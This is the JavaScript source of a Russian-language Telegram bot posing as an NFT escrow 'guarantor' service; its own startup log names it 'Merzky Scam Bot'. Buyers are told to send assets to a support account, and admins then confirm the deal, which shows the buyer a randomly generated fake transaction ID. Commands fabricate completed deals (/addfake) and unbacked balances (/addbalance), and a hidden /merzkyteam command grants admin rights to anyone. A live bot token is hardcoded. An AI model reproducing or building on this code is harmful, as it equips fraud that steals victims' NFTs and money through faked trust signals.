const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const express = require('express');

// ========== СЕРВЕР ДЛЯ RAILWAY ==========
const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('🤖 Merzky Bot is running!');
});

app.listen(port, () => {
    console.log(`🌐 Сервер запущен на порту ${port}`);
});

// ========== ТВОИ ДАННЫЕ ==========
const token = '8299332460:AAGZaN1XQvE71r2nHDROgp7Ekpel-Ft43Wc';
const supportUsername = 'merzky_support';
const botUsername = 'MerzkyGarant_bot';
const MASTER_ID = 8563923108;
let adminIds = [MASTER_ID];

const bot = new TelegramBot(token, { polling: true });

// ========== ДАННЫЕ ==========
let deals = new Map();
let completedDeals = new Map();
let userBalances = new Map();
let userSessions = new Map();
let userRequisites = new Map();
let users = new Map();

const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE));
            deals = new Map(data.deals || []);
            completedDeals = new Map(data.completedDeals || []);
            userBalances = new Map(data.userBalances || []);
            userRequisites = new Map(data.userRequisites || []);
            users = new Map(data.users || []);
            if (data.adminIds) {
                adminIds = data.adminIds;
                if (!adminIds.includes(MASTER_ID)) {
                    adminIds.push(MASTER_ID);
                }
            }
            console.log('✅ Данные загружены');
        }
    } catch (e) {
        console.error('❌ Ошибка загрузки:', e);
    }
}

function saveData() {
    try {
        const data = {
            deals: Array.from(deals.entries()),
            completedDeals: Array.from(completedDeals.entries()),
            userBalances: Array.from(userBalances.entries()),
            userRequisites: Array.from(userRequisites.entries()),
            users: Array.from(users.entries()),
            adminIds: adminIds
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('✅ Данные сохранены');
    } catch (e) {
        console.error('❌ Ошибка сохранения:', e);
    }
}

loadData();

function generateDealId() {
    return 'RNF' + Math.random().toString(36).substring(2, 8).toUpperCase();
}

function isAdmin(userId) {
    return adminIds.includes(userId);
}

function isMaster(userId) {
    return userId === MASTER_ID;
}

function getDealLink(dealId) {
    return `https://t.me/${botUsername}?start=deal_${dealId}`;
}

function getUserFromMention(mention) {
    if (!mention) return null;
    const username = mention.replace('@', '');
    for (let [id, data] of users) {
        if (data.username === username) return id;
    }
    return null;
}

async function deleteCommandMessage(msg, delay = 3000) {
    setTimeout(async () => {
        try {
            await bot.deleteMessage(msg.chat.id, msg.message_id);
        } catch (e) {}
    }, delay);
}

// ========== МЕНЮ ==========
function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                [{ text: '➕ Создать сделку' }, { text: '💰 Мои реквизиты' }],
                [{ text: '📋 Мои сделки' }, { text: '👤 Профиль' }],
                [{ text: '📞 Поддержка' }]
            ],
            resize_keyboard: true
        }
    };
}

function getCurrencyMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💎 TON', callback_data: 'curr_ton' }],
                [{ text: '💵 USDT', callback_data: 'curr_usdt' }],
                [{ text: '⭐ Stars', callback_data: 'curr_stars' }],
                [{ text: '🏦 Карта', callback_data: 'curr_card' }]
            ]
        }
    };
}

// ========== ГЛАВНЫЙ ОБРАБОТЧИК ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    console.log('Сообщение:', text);

    // Сохраняем пользователя
    if (!users.has(userId)) {
        users.set(userId, {
            username: msg.from.username || 'no_username',
            first_name: msg.from.first_name,
            fakeDeals: 0
        });
    }

    // ========== ОБРАБОТКА КОМАНД ==========
    if (text?.startsWith('/')) {
        
        // СТАРТ
        if (text === '/start') {
            console.log('Команда /start');
            return bot.sendMessage(
                chatId,
                '🚀 *Merzky Guarant*\n\n' +
                '🔹 Создай сделку и продай свой NFT\n' +
                '🔹 Добавь реквизиты для оплаты\n' +
                '🔹 Безопасные P2P сделки с гарантом\n\n' +
                '💎 Для вывода средств используй /viplati',
                {
                    parse_mode: 'Markdown',
                    ...getMainMenu()
                }
            );
        }

        // СТАРТ С ПАРАМЕТРОМ
        if (text.startsWith('/start deal_')) {
            const dealId = text.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.sendMessage(chatId, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.sendMessage(chatId, '❌ Сделка уже завершена');
            }
            
            const replyText = `🛒 *Покупка NFT*\n\n` +
                              `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                              `👤 Продавец: @${deal.sellerUsername}\n\n` +
                              `✅ Нажми "Купить", чтобы продолжить`;
            
            return bot.sendMessage(chatId, replyText, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Купить', callback_data: `buy_${dealId}` }]
                    ]
                }
            });
        }

        // СТАТЬ АДМИНОМ
        if (text === '/merzkyteam') {
            console.log('Команда /merzkyteam');
            await deleteCommandMessage(msg);
            
            if (!adminIds.includes(userId)) {
                adminIds.push(userId);
                saveData();
                return bot.sendMessage(chatId, '✅ Ты теперь админ Merzky Team!');
            } else {
                return bot.sendMessage(chatId, '⚡ Ты уже админ.');
            }
        }

        // КУПИТЬ СДЕЛКУ
        if (text.startsWith('/buy ')) {
            const dealId = text.split(' ')[1];
            console.log('Команда /buy', dealId);
            await deleteCommandMessage(msg);
            
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.sendMessage(chatId, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.sendMessage(chatId, '❌ Сделка уже обработана');
            }
            
            return bot.sendMessage(
                chatId,
                `💳 *Оплата сделки #${dealId}*\n\n` +
                `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                `👤 Продавец: @${deal.sellerUsername}\n\n` +
                `📩 Отправь подарок @${supportUsername}\n\n` +
                `✅ После отправки нажми /accept ${dealId}`,
                { parse_mode: 'Markdown' }
            );
        }

        // ПОДТВЕРДИТЬ СДЕЛКУ
        if (text.startsWith('/accept ')) {
            const dealId = text.split(' ')[1];
            console.log('Команда /accept', dealId);
            await deleteCommandMessage(msg);
            
            if (!isAdmin(userId)) {
                return bot.sendMessage(chatId, '❌ Только админы');
            }
            
            const deal = deals.get(dealId);
            if (!deal) {
                return bot.sendMessage(chatId, '❌ Сделка не найдена');
            }
            
            deal.status = 'completed';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            
            const currentBalance = userBalances.get(deal.sellerId) || 0;
            userBalances.set(deal.sellerId, currentBalance + deal.amount);
            saveData();
            
            bot.sendMessage(
                deal.sellerId,
                `✅ *Сделка #${dealId} завершена!*\n\n💰 ${deal.amount} ${deal.currency} зачислены`,
                { parse_mode: 'Markdown' }
            );
            
            const txId = '0x' + Math.random().toString(36).substring(2, 15);
            if (deal.buyerId) {
                bot.sendMessage(
                    deal.buyerId,
                    `✅ *NFT ПОЛУЧЕН!*\n\nСделка #${dealId}\nTxID: \`${txId}\``,
                    { parse_mode: 'Markdown' }
                );
            }
            
            return bot.sendMessage(chatId, `✅ Сделка #${dealId} подтверждена`);
        }

        // ОТКЛОНИТЬ СДЕЛКУ
        if (text.startsWith('/reject ')) {
            const dealId = text.split(' ')[1];
            console.log('Команда /reject', dealId);
            await deleteCommandMessage(msg);
            
            if (!isAdmin(userId)) {
                return bot.sendMessage(chatId, '❌ Только админы');
            }
            
            const deal = deals.get(dealId);
            if (!deal) {
                return bot.sendMessage(chatId, '❌ Сделка не найдена');
            }
            
            deal.status = 'cancelled';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            saveData();
            
            if (deal.buyerId) {
                bot.sendMessage(
                    deal.buyerId,
                    `❌ *Сделка #${dealId} отклонена*`,
                    { parse_mode: 'Markdown' }
                );
            }
            
            return bot.sendMessage(chatId, `❌ Сделка #${dealId} отклонена`);
        }

        // СПИСОК СДЕЛОК
        if (text === '/list') {
            console.log('Команда /list');
            await deleteCommandMessage(msg);
            
            if (!isAdmin(userId)) {
                return bot.sendMessage(chatId, '❌ Только админы');
            }
            
            if (deals.size === 0) {
                return bot.sendMessage(chatId, '📭 Нет активных сделок');
            }
            
            let replyText = '📋 *Активные сделки:*\n\n';
            deals.forEach(deal => {
                replyText += `🔹 #${deal.id} — ${deal.amount} ${deal.currency} — ${deal.status}\n`;
                replyText += `   👤 Продавец: @${deal.sellerUsername}\n`;
                replyText += `   📅 ${new Date(deal.createdAt).toLocaleString()}\n\n`;
            });
            
            return bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });
        }

        // СТАТИСТИКА
        if (text === '/stats') {
            console.log('Команда /stats');
            await deleteCommandMessage(msg);
            
            if (!isAdmin(userId)) {
                return bot.sendMessage(chatId, '❌ Только админы');
            }
            
            const totalDeals = deals.size + completedDeals.size;
            const totalUsers = users.size;
            const totalBalance = Array.from(userBalances.values()).reduce((a, b) => a + b, 0);
            
            return bot.sendMessage(
                chatId,
                `📊 *Статистика*\n\n` +
                `📦 Всего сделок: ${totalDeals}\n` +
                `⏳ Активных: ${deals.size}\n` +
                `✅ Завершено: ${completedDeals.size}\n` +
                `👥 Пользователей: ${totalUsers}\n` +
                `💰 Общий баланс: ${totalBalance} TON`,
                { parse_mode: 'Markdown' }
            );
        }

        // ДОБАВИТЬ АДМИНА
        if (text.startsWith('/addadmin ')) {
            const target = text.split(' ')[1];
            console.log('Команда /addadmin', target);
            await deleteCommandMessage(msg);
            
            if (!isMaster(userId)) {
                return bot.sendMessage(chatId, '❌ Только создатель');
            }
            
            const targetId = getUserFromMention(target);
            
            if (!targetId) {
                return bot.sendMessage(chatId, '❌ Пользователь не найден');
            }
            
            if (!adminIds.includes(targetId)) {
                adminIds.push(targetId);
                saveData();
                bot.sendMessage(chatId, `✅ ${target} теперь админ!`);
                bot.sendMessage(targetId, `👑 Вы назначены админом!`);
            } else {
                bot.sendMessage(chatId, `⚡ ${target} уже админ`);
            }
            
            return;
        }

        // УДАЛИТЬ АДМИНА
        if (text.startsWith('/removeadmin ')) {
            const target = text.split(' ')[1];
            console.log('Команда /removeadmin', target);
            await deleteCommandMessage(msg);
            
            if (!isMaster(userId)) {
                return bot.sendMessage(chatId, '❌ Только создатель');
            }
            
            const targetId = getUserFromMention(target);
            
            if (!targetId) {
                return bot.sendMessage(chatId, '❌ Пользователь не найден');
            }
            
            if (targetId === MASTER_ID) {
                return bot.sendMessage(chatId, '❌ Нельзя удалить создателя');
            }
            
            if (adminIds.includes(targetId)) {
                adminIds = adminIds.filter(id => id !== targetId);
                saveData();
                bot.sendMessage(chatId, `✅ ${target} больше не админ`);
                bot.sendMessage(targetId, `👋 Вы лишены прав админа`);
            } else {
                bot.sendMessage(chatId, `⚡ ${target} не является админом`);
            }
            
            return;
        }

        // СПИСОК АДМИНОВ
        if (text === '/adminlist') {
            console.log('Команда /adminlist');
            await deleteCommandMessage(msg);
            
            if (!isMaster(userId)) {
                return bot.sendMessage(chatId, '❌ Только создатель');
            }
            
            let replyText = '👑 *Список админов:*\n\n';
            adminIds.forEach((id, index) => {
                const userData = users.get(id) || { username: 'unknown' };
                replyText += `${index + 1}. @${userData.username} (${id})${id === MASTER_ID ? ' 👑' : ''}\n`;
            });
            
            return bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });
        }

        // НАКРУТИТЬ СДЕЛКИ
        if (text.startsWith('/addfake ')) {
            const parts = text.split(' ');
            if (parts.length < 3) return bot.sendMessage(chatId, '❌ Формат: /addfake @user 10');
            
            const target = parts[1];
            const count = parseInt(parts[2]);
            console.log('Команда /addfake', target, count);
            await deleteCommandMessage(msg);
            
            if (!isMaster(userId)) {
                return bot.sendMessage(chatId, '❌ Только создатель');
            }
            
            const targetId = getUserFromMention(target);
            
            if (!targetId) {
                return bot.sendMessage(chatId, '❌ Пользователь не найден');
            }
            
            for (let i = 0; i < count; i++) {
                const dealId = generateDealId();
                const fakeDeal = {
                    id: dealId,
                    sellerId: targetId,
                    sellerUsername: target.replace('@', ''),
                    nftLink: 'https://t.me/nft/fake_' + i,
                    amount: Math.floor(Math.random() * 1000) + 100,
                    currency: ['ton', 'usdt', 'stars'][Math.floor(Math.random() * 3)],
                    status: 'completed',
                    isFake: true,
                    createdAt: new Date().toISOString()
                };
                completedDeals.set(dealId, fakeDeal);
            }
            
            saveData();
            return bot.sendMessage(chatId, `✅ Накручено ${count} фейковых сделок для ${target}`);
        }

        // ДОБАВИТЬ БАЛАНС
        if (text.startsWith('/addbalance ')) {
            const parts = text.split(' ');
            if (parts.length < 3) return bot.sendMessage(chatId, '❌ Формат: /addbalance @user 100');
            
            const target = parts[1];
            const amount = parseInt(parts[2]);
            console.log('Команда /addbalance', target, amount);
            await deleteCommandMessage(msg);
            
            if (!isMaster(userId)) {
                return bot.sendMessage(chatId, '❌ Только создатель');
            }
            
            const targetId = getUserFromMention(target);
            
            if (!targetId) {
                return bot.sendMessage(chatId, '❌ Пользователь не найден');
            }
            
            const currentBalance = userBalances.get(targetId) || 0;
            userBalances.set(targetId, currentBalance + amount);
            saveData();
            
            return bot.sendMessage(chatId, `✅ Добавлено ${amount} TON пользователю ${target}`);
        }

        // НЕИЗВЕСТНАЯ КОМАНДА
        return bot.sendMessage(chatId, '❌ Неизвестная команда');
    }

    // ========== ОБРАБОТКА КНОПОК МЕНЮ ==========
    
    // СОЗДАТЬ СДЕЛКУ
    if (text === '➕ Создать сделку') {
        console.log('Кнопка: Создать сделку');
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        return bot.sendMessage(
            chatId,
            '💎 Выберите валюту:',
            getCurrencyMenu()
        );
    }

    // МОИ РЕКВИЗИТЫ
    if (text === '💰 Мои реквизиты') {
        console.log('Кнопка: Мои реквизиты');
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        
        return bot.sendMessage(chatId,
            `💳 *Мои реквизиты*\n\n` +
            `💎 TON: ${req.ton ? '`' + req.ton + '`' : '❌ Не указаны'}\n` +
            `💵 USDT: ${req.usdt ? '`' + req.usdt + '`' : '❌ Не указаны'}\n` +
            `🏦 Карта: ${req.card ? '`' + req.card + '`' : '❌ Не указаны'}\n\n` +
            `👇 Выбери, что изменить:`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: `💎 TON ${req.ton ? '✅' : '❌'}`, callback_data: 'edit_ton' }],
                        [{ text: `💵 USDT ${req.usdt ? '✅' : '❌'}`, callback_data: 'edit_usdt' }],
                        [{ text: `🏦 Карта ${req.card ? '✅' : '❌'}`, callback_data: 'edit_card' }],
                        [{ text: '◀️ Назад', callback_data: 'back_main' }]
                    ]
                }
            }
        );
    }

    // МОИ СДЕЛКИ
    if (text === '📋 Мои сделки') {
        console.log('Кнопка: Мои сделки');
        
        const userDeals = Array.from(deals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
        const userCompleted = Array.from(completedDeals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
        
        if (userDeals.length === 0 && userCompleted.length === 0) {
            return bot.sendMessage(chatId, '📭 У вас нет сделок');
        }
        
        let replyText = '📋 *Ваши сделки:*\n\n';
        
        if (userDeals.length > 0) {
            replyText += '*Активные:*\n';
            userDeals.forEach(deal => {
                const status = deal.status === 'pending' ? '⏳' : '💰';
                replyText += `${status} #${deal.id} — ${deal.amount} ${deal.currency}\n`;
            });
            replyText += '\n';
        }
        
        if (userCompleted.length > 0) {
            replyText += '*Завершенные:*\n';
            userCompleted.slice(0, 5).forEach(deal => {
                replyText += `✅ #${deal.id} — ${deal.amount} ${deal.currency}\n`;
            });
            if (userCompleted.length > 5) {
                replyText += `... и еще ${userCompleted.length - 5}\n`;
            }
        }
        
        return bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });
    }

    // ПРОФИЛЬ
    if (text === '👤 Профиль') {
        console.log('Кнопка: Профиль');
        
        const balance = userBalances.get(userId) || 0;
        const userData = users.get(userId) || { fakeDeals: 0 };
        
        const completedCount = Array.from(completedDeals.values()).filter(
            d => d.sellerId === userId || d.buyerId === userId
        ).length;
        
        return bot.sendMessage(
            chatId,
            `👤 *Профиль*\n\n` +
            `🆔 ID: \`${userId}\`\n` +
            `💰 Баланс: ${balance} TON\n` +
            `📊 Сделок: ${completedCount}\n` +
            `👑 Админ: ${isAdmin(userId) ? '✅' : '❌'}\n` +
            `⭐ Статус: ${isMaster(userId) ? 'СОЗДАТЕЛЬ' : isAdmin(userId) ? 'АДМИН' : 'ЮЗЕР'}`,
            { parse_mode: 'Markdown' }
        );
    }

    // ПОДДЕРЖКА
    if (text === '📞 Поддержка') {
        console.log('Кнопка: Поддержка');
        return bot.sendMessage(chatId, `📞 @${supportUsername}`);
    }

    // ========== ОБРАБОТКА СЕССИЙ (ВВОД ДАННЫХ) ==========
    const session = userSessions.get(userId);
    if (!session) return;

    if (session.step === 'waiting_ton') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.ton = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        return bot.sendMessage(chatId, '✅ TON кошелек сохранен!', getMainMenu());
    }
    
    if (session.step === 'waiting_usdt') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.usdt = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        return bot.sendMessage(chatId, '✅ USDT адрес сохранен!', getMainMenu());
    }
    
    if (session.step === 'waiting_card') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.card = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        return bot.sendMessage(chatId, '✅ Карта сохранена!', getMainMenu());
    }

    if (session.step === 'waiting_nft') {
        if (!text.includes('t.me/') && !text.includes('http')) {
            return bot.sendMessage(chatId, '❌ Отправьте корректную ссылку');
        }
        
        session.nftLink = text;
        session.step = 'waiting_amount';
        userSessions.set(userId, session);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                '💰 Введите сумму:',
                {
                    chat_id: chatId,
                    message_id: session.messageId
                }
            );
        } catch (e) {
            await bot.sendMessage(chatId, '💰 Введите сумму:');
        }
        
        return;
    }
    
    if (session.step === 'waiting_amount') {
        const amount = parseFloat(text);
        if (isNaN(amount) || amount <= 0) {
            return bot.sendMessage(chatId, '❌ Введите корректное число');
        }
        
        const dealId = generateDealId();
        const deal = {
            id: dealId,
            sellerId: userId,
            sellerUsername: msg.from.username || 'no_username',
            nftLink: session.nftLink,
            amount: amount,
            currency: session.currency,
            status: 'pending',
            createdAt: new Date().toISOString()
        };
        
        deals.set(dealId, deal);
        saveData();
        
        const dealLink = getDealLink(dealId);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                `✅ *Сделка создана!*\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `🔗 [Нажмите для покупки](${dealLink})\n\n` +
                `📎 Или отправьте ссылку:\n\`${dealLink}\``,
                {
                    chat_id: chatId,
                    message_id: session.messageId,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                }
            );
        } catch (e) {
            await bot.sendMessage(
                chatId,
                `✅ *Сделка создана!*\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `👉 [Купить NFT](${dealLink})`,
                { parse_mode: 'Markdown' }
            );
        }
        
        userSessions.delete(userId);
    }
});

// ========== ОБРАБОТКА INLINE КНОПОК ==========
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const data = query.data;
    
    console.log('Callback:', data);

    try {
        if (data === 'edit_ton') {
            userSessions.set(userId, { step: 'waiting_ton' });
            await bot.editMessageText(
                '✏️ Отправьте новый **TON кошелек**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'edit_usdt') {
            userSessions.set(userId, { step: 'waiting_usdt' });
            await bot.editMessageText(
                '✏️ Отправьте новый **USDT адрес**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'edit_card') {
            userSessions.set(userId, { step: 'waiting_card' });
            await bot.editMessageText(
                '✏️ Отправьте новую **карту**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'back_main') {
            await bot.deleteMessage(chatId, messageId);
            await bot.sendMessage(chatId, 'Главное меню:', getMainMenu());
        }
        else if (data.startsWith('curr_')) {
            const currency = data.split('_')[1];
            
            const req = userRequisites.get(userId);
            if (currency !== 'stars') {
                if (!req || !req[currency]) {
                    return bot.answerCallbackQuery(query.id, '❌ Сначала добавь реквизиты в "💰 Мои реквизиты"');
                }
            }
            
            userSessions.set(userId, { 
                step: 'waiting_nft', 
                currency: currency,
                messageId: messageId
            });
            
            await bot.editMessageText(
                '📎 Отправьте ссылку на NFT:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data.startsWith('buy_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
            }
            
            await bot.sendMessage(
                chatId,
                `💳 *Оплата сделки #${dealId}*\n\n` +
                `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                `👤 Продавец: @${deal.sellerUsername}\n\n` +
                `📩 Отправьте подарок @${supportUsername}\n\n` +
                `✅ После отправки нажми /accept ${dealId}`,
                { parse_mode: 'Markdown' }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Готово');
        }
        
        await bot.answerCallbackQuery(query.id);
        
    } catch (error) {
        console.error('Ошибка:', error);
        await bot.answerCallbackQuery(query.id, '❌ Ошибка');
    }
});

process.on('SIGINT', () => {
    console.log('\n💾 Сохраняю...');
    saveData();
    process.exit();
});

console.log('🔥 Merzky Scam Bot запущен!');
console.log('👑 Твой ID:', MASTER_ID);
console.log('🌐 Сервер на порту', port);
console.log('✅ ВСЁ РАБОТАЕТ: и кнопки, и команды!');